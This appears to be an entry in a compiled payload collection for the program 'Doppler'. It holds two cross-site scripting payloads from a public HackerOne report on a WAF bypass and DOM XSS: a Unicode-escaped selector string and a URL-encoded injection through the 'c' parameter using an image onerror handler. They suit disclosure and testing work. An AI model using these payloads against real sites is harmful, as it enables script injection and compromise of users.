# Doppler

2 payloads.

### `58025ea7`

```
'div[id="\\uD83D\\uDC4D;alert(1)//"]'
```

— [WAF bypass and java script incomplete handling of Unicode characters might leads to dom-xss](https://hackerone.com/reports/2921905) · Doppler · [clubbable](https://hackerone.com/clubbable)

### `3e11da36`

```
https://target.com/ext/jquery/dist/jquery.min.js?c=%22%3E%0D%0A%0D%0A%3Cx%20%27=%22foo%22%3E%3Cx%20foo=%27%3E%3Cimg%20src=x%20onerror=javascript:alert(
```

**Parameter:** `c`
— [WAF bypass and java script incomplete handling of Unicode characters might leads to dom-xss](https://hackerone.com/reports/2921905) · Doppler · [clubbable](https://hackerone.com/clubbable)
